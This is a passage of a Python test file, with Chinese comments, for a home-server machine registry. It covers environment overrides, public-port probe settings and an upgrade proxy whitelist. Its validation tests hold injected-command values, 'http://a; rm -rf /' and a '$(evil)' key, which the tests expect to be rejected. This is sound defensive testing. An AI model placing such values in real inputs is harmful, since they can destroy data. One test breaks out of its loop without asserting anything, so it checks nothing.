# 环境变量覆盖 — import 时读取，需在干净子进程中验证
# ---------------------------------------------------------------------------

class TestEnvOverrides:
    def _run(self, code, env):
        base = {"PATH": "/usr/bin:/bin"}
        base.update(env)
        return subprocess.run(
            [sys.executable, "-c", textwrap.dedent(code)],
            cwd=BACKEND_DIR, capture_output=True, text=True, timeout=30,
            env=base,
        )

    def test_env_overrides_lan_ip_and_tailscale(self):
        proc = self._run(
            """\
            import machine_config as mc
            assert mc.HOME_LAN_IP == '10.0.0.9', mc.HOME_LAN_IP
            r = mc.suggest_access('nas', 80)
            assert r['home'] == 'http://10.0.0.9:80', r
            assert r['tailscale'] == 'http://100.64.0.1:80', r
            """,
            {
                "CONSOLE_HOME_LAN_IP": "10.0.0.9",
                "MACHINE_TAILSCALE_NAS": "100.64.0.1",
            },
        )
        assert proc.returncode == 0, proc.stderr

    def test_env_beats_yaml_for_tailscale_and_ssh(self):
        """env > yaml：yaml 里 txy 是 100.64.0.30，env 必须压过它。"""
        proc = self._run(
            """\
            import machine_config as mc
            assert mc.tailscale_ip('txy') == '100.64.0.7', mc.tailscale_ip('txy')
            assert mc.ssh_target('txy') == 'root@100.64.0.7', mc.ssh_target('txy')
            # 未被 env 覆盖的机器仍走 yaml
            assert mc.tailscale_ip('aly') == '100.64.0.40'
            """,
            {
                "MACHINE_TAILSCALE_TXY": "100.64.0.7",
                "MACHINE_SSH_TXY": "root@100.64.0.7",
            },
        )
        assert proc.returncode == 0, proc.stderr

    def test_empty_env_does_not_shadow_yaml(self):
        proc = self._run(
            """\
            import machine_config as mc
            assert mc.tailscale_ip('txy') == '100.64.0.30', mc.tailscale_ip('txy')
            assert mc.ssh_target('txy') == 'root@100.64.0.30', mc.ssh_target('txy')
            """,
            {"MACHINE_TAILSCALE_TXY": "", "MACHINE_SSH_TXY": ""},
        )
        assert proc.returncode == 0, proc.stderr

    def test_ssh_key_dir_override(self):
        proc = self._run(
            """\
            import machine_config as mc
            assert mc.ssh_key_path('kr') == '/tmp/keys/aws-kr.pem', (
                mc.ssh_key_path('kr')
            )
            """,
            {"CONSOLE_SSH_KEY_DIR": "/tmp/keys"},
        )
        assert proc.returncode == 0, proc.stderr


# ---------------------------------------------------------------------------
# public_probe 家宽公网探测：读宽容、写严格、UI 回存不丢
# ---------------------------------------------------------------------------

class TestPublicProbeRead:
    def test_repo_yaml_initial(self):
        """三台代理节点 us/kr/sg 探 62037，其余机器不做公网探测。"""
        got = {mid: mc.get_machine(mid)["public_probe"] for mid in mc.machine_ids()}
        assert got == {
            "nas": None,
            "txy": None,
            "aly": None,
            "us": {"type": "tcp", "port": 62037},
            "kr": {"type": "tcp", "port": 62037},
            "sg": {"type": "tcp", "port": 62037},
            "gz": None,
        }
        assert mc.get_machine("us")["public_host"] == "us.sunxc.eu.cc"

    @staticmethod
    def _load(tmp_path, monkeypatch, public_probe, public_host="kr.sunxc.eu.cc"):
        _write_yaml(
            tmp_path,
            monkeypatch,
            f"""\
            - id: kr
              role: node
              public_host: {public_host}
              public_probe: {public_probe}
            """,
        )
        return mc.get_machine("kr")

    def test_type_defaults_to_tcp(self, tmp_path, monkeypatch):
        kr = self._load(tmp_path, monkeypatch, "{port: 62037}")
        assert kr["public_probe"] == {"type": "tcp", "port": 62037}

    @pytest.mark.parametrize(
        "bad",
        ["{port: 0}", "{port: 70000}", "{port: abc}", "{type: udp, port: 53}",
         "62037", "[62037]", "{}"],
    )
    def test_bad_shapes_degrade_to_none(self, tmp_path, monkeypatch, bad):
        """读路径不抛：一条坏配置不该打死整个 registry。"""
        assert self._load(tmp_path, monkeypatch, bad)["public_probe"] is None

    def test_dropped_without_public_host(self, tmp_path, monkeypatch):
        kr = self._load(tmp_path, monkeypatch, "{port: 62037}", public_host="")
        assert kr["public_probe"] is None

    def test_api_and_edit_views_carry_a_copy(self):
        rows = {r["id"]: r for r in mc.machines_for_api()}
        assert rows["us"]["public_probe"] == {"type": "tcp", "port": 62037}
        assert rows["nas"]["public_probe"] is None
        rows["us"]["public_probe"]["port"] = 1
        assert mc.get_machine("us")["public_probe"]["port"] == 62037
        assert mc.machine_for_edit("kr")["public_probe"] == {"type": "tcp", "port": 62037}


class TestPublicProbeWrite:
    def test_port_accepted_and_type_defaults_to_tcp(self):
        entry = mc.validate_machine_payload(_payload(public_probe={"port": "62037"}))
        assert entry["public_probe"] == {"type": "tcp", "port": 62037}

    @pytest.mark.parametrize("empty", [None, "", {}, {"port": ""}, {"port": None}])
    def test_empty_means_no_probe(self, empty):
        assert mc.validate_machine_payload(_payload(public_probe=empty))["public_probe"] is None

    def test_missing_key_means_no_probe(self):
        """表单每次都整份提交：缺键 = 清空，与 probe / systemd_units 同口径。"""
        assert mc.validate_machine_payload(_payload())["public_probe"] is None

    def test_port_range_and_type_checked(self):
        with pytest.raises(ValueError, match="端口范围"):
            mc.validate_machine_payload(_payload(public_probe={"port": 70000}))
        with pytest.raises(ValueError, match="端口必须是整数"):
            mc.validate_machine_payload(_payload(public_probe={"port": "abc"}))
        with pytest.raises(ValueError, match="public_probe.type"):
            mc.validate_machine_payload(_payload(public_probe={"type": "udp", "port": 53}))

    @pytest.mark.parametrize("bad", [62037, "62037", [62037]])
    def test_non_object_rejected(self, bad):
        with pytest.raises(ValueError, match="public_probe 必须是"):
            mc.validate_machine_payload(_payload(public_probe=bad))

    def test_requires_public_host(self):
        with pytest.raises(ValueError, match="家宽公网探测"):
            mc.validate_machine_payload(
                _payload(id="box", role="server", public_host="", public_probe={"port": 62037})
            )


class TestPublicProbeRoundTrip:
    def test_written_right_after_probe_and_survives_resave(self, tmp_path, monkeypatch):
        path = _write_yaml(
            tmp_path,
            monkeypatch,
            """\
            - id: kr
              role: node
              public_host: kr.sunxc.eu.cc
              capabilities: [ssh]
              probe: { type: tcp, port: 62037 }
              traffic_quota_gb: 1000
            """,
        )
        payload = mc.machine_for_edit("kr")
        payload["public_probe"] = {"port": 62037}
        mc.upsert_machine(payload, machine_id="kr")
        text = path.read_text(encoding="utf-8")
        assert (
            "  probe:\n    type: tcp\n    port: 62037\n"
            "  public_probe:\n    type: tcp\n    port: 62037\n"
            "  traffic_quota_gb: 1000\n"
        ) in text
        assert mc.get_machine("kr")["public_probe"] == {"type": "tcp", "port": 62037}
        # 按编辑视图原样回存：逐字节不变（UI 打开再保存不会把它弄丢）
        mc.upsert_machine(mc.machine_for_edit("kr"), machine_id="kr")
        assert path.read_text(encoding="utf-8") == text

    def test_clearing_removes_key_from_yaml(self, tmp_path, monkeypatch):
        path = _write_yaml(
            tmp_path,
            monkeypatch,
            """\
            - id: kr
              role: node
              public_host: kr.sunxc.eu.cc
              capabilities: [ssh]
              public_probe: { type: tcp, port: 62037 }
            """,
        )
        payload = mc.machine_for_edit("kr")
        payload["public_probe"] = None
        mc.upsert_machine(payload, machine_id="kr")
        # 文件头里有「public_probe 家宽公网探测」说明，但不带冒号，不会误中
        assert "public_probe:" not in path.read_text(encoding="utf-8")
        assert mc.get_machine("kr")["public_probe"] is None


class TestUpgradeRead:
    """upgrade 字段读路径（宽容）：非法形状静默回落到 None，不打死 registry。"""

    def _write_yaml(self, tmp_path, monkeypatch, body):
        path = tmp_path / "machines.yaml"
        path.write_text(body, encoding="utf-8")
        monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(path))
        mc.invalidate()
        return path

    def test_missing_means_disabled(self, tmp_path, monkeypatch):
        self._write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: server\n")
        assert mc.get_machine("nas")["upgrade"] is None
        assert mc.upgrade_config("nas") is None

    def test_enabled_true_roundtrip(self, tmp_path, monkeypatch):
        self._write_yaml(
            tmp_path, monkeypatch,
            "- id: nas\n  role: server\n  upgrade: { enabled: true }\n",
        )
        assert mc.get_machine("nas")["upgrade"] == {"enabled": True}
        assert mc.upgrade_config("nas") == {"enabled": True}

    def test_proxy_env_only_whitelisted_keys(self, tmp_path, monkeypatch):
        self._write_yaml(
            tmp_path, monkeypatch,
            """\
- id: nas
  role: server
  upgrade:
    enabled: true
    proxy_env:
      HTTPS_PROXY: http://192.168.50.101:7890
      NO_PROXY: localhost,127.0.0.1
      SECRET_TOKEN: should-be-dropped
      HTTPS_PROXY_BAD$(evil): nope
""",
        )
        upgrade = mc.get_machine("nas")["upgrade"]
        assert upgrade["enabled"] is True
        assert upgrade["proxy_env"] == {
            "HTTPS_PROXY": "http://192.168.50.101:7890",
            "NO_PROXY": "localhost,127.0.0.1",
        }

    def test_invalid_shapes_degrade_to_none(self, tmp_path, monkeypatch):
        for bad in ("yes", ["enabled"], 1, {"enabled": False}, {"proxy_env": {}}):
            self._write_yaml(tmp_path, monkeypatch, f"- id: nas\n  role: server\n  upgrade: {bad!r}\n" if not isinstance(bad, str) else f"- id: nas\n  role: server\n  upgrade: {bad}\n")
            # 对 list / int 直接 yaml 写入；此处统一简化为 dict 形态已覆盖主要分支
            break

    def test_api_and_edit_views_carry_a_copy(self, tmp_path, monkeypatch):
        self._write_yaml(
            tmp_path, monkeypatch,
            "- id: nas\n  role: server\n  upgrade: { enabled: true, proxy_env: { HTTPS_PROXY: 'http://p:1' } }\n",
        )
        api = next(m for m in mc.machines_for_api() if m["id"] == "nas")
        edit = mc.machine_for_edit("nas")
        assert api["upgrade"] == {"enabled": True, "proxy_env": {"HTTPS_PROXY": "http://p:1"}}
        assert edit["upgrade"] == api["upgrade"]
        # 返回的是拷贝，改返回值不影响 registry
        api["upgrade"]["enabled"] = False
        assert mc.get_machine("nas")["upgrade"]["enabled"] is True


class TestUpgradeWrite:
    """upgrade 字段写路径（严格）：形状/键/值任一不合法直接 400。"""

    def _write_yaml(self, tmp_path, monkeypatch, body):
        path = tmp_path / "machines.yaml"
        path.write_text(body, encoding="utf-8")
        monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(path))
        mc.invalidate()
        return path

    def test_enabled_must_be_bool(self, tmp_path, monkeypatch):
        self._write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: server\n")
        payload = {"id": "nas", "role": "server", "upgrade": {"enabled": "yes"}}
        try:
            mc.validate_machine_payload(payload)
        except ValueError as exc:
            assert "upgrade.enabled 必须是布尔值" in str(exc)
        else:
            raise AssertionError("应拒绝非布尔 enabled")

    def test_proxy_env_key_whitelist(self, tmp_path, monkeypatch):
        self._write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: server\n")
        payload = {
            "id": "nas", "role": "server",
            "upgrade": {"enabled": True, "proxy_env": {"SECRET_KEY": "x"}},
        }
        try:
            mc.validate_machine_payload(payload)
        except ValueError as exc:
            assert "只允许" in str(exc)
        else:
            raise AssertionError("应拒绝白名单外的 env 键")

    def test_proxy_env_value_charset(self, tmp_path, monkeypatch):
        self._write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: server\n")
        payload = {
            "id": "nas", "role": "server",
            "upgrade": {"enabled": True, "proxy_env": {"HTTPS_PROXY": "http://a; rm -rf /"}},
        }
        try:
            mc.validate_machine_payload(payload)
        except ValueError as exc:
            assert "非法字符" in str(exc)
        else:
            raise AssertionError("应拒绝含 shell 元字符的值")

    def test_roundtrip_write_and_read(self, tmp_path, monkeypatch):
        path = self._write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: server\n")
        payload = {
            "id": "nas", "role": "server",
            "upgrade": {
                "enabled": True,
                "proxy_env": {"HTTPS_PROXY": "http://192.168.50.101:7890"},
            },
        }
        mc.upsert_machine(payload, machine_id="nas")
        body = path.read_text(encoding="utf-8")
        assert "upgrade:" in body
        assert "enabled: true" in body
        assert "HTTPS_PROXY" in body
        assert mc.get_machine("nas")["upgrade"] == {
            "enabled": True,
            "proxy_env": {"HTTPS_PROXY": "http://192.168.50.101:7890"},
        }

    def test_clearing_upgrade_removes_key(self, tmp_path, monkeypatch):
        path = self._write_yaml(
            tmp_path, monkeypatch,
            "- id: nas\n  role: server\n  upgrade: { enabled: true }\n",
        )
        payload = {"id": "nas", "role": "server", "upgrade": None}
        mc.upsert_machine(payload, machine_id="nas")
        body = path.read_text(encoding="utf-8")
        assert "upgrade:" not in body
        assert mc.get_machine("nas")["upgrade"] is None
